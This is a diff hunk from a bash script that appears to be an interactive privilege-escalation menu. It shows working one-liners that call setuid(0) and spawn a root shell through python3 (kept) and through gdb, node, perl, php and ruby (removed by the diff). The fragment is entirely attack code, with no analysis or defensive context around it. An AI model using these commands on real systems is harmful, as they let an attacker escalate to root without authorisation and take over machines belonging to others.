@@ -124,26 +124,6 @@ while true; do
                         echo "Trying with python3"
                         "$choice" -c 'import os; os.setuid(0); os.system("bash")'
                         ;;
-                    *gdb*)
-                        echo "Trying with gdb"
-                        "$choice" -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
-                        ;;
-                    *node*)
-                        echo "Trying with node"
-                        "$choice" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
-                        ;;
-                    *perl*)
-                        echo "Trying with perl"
-                        "$choice" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
-                        ;;
-                    *php*)
-                        echo "Trying with php"
-                        "$choice" -r 'posix_setuid(0); system("/bin/sh -i");'
-                        ;;
-                    *ruby*)
-                        echo "Trying with ruby"
-                        "$choice" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
-                        ;;
                     "Go Back")
                         break
                         ;;
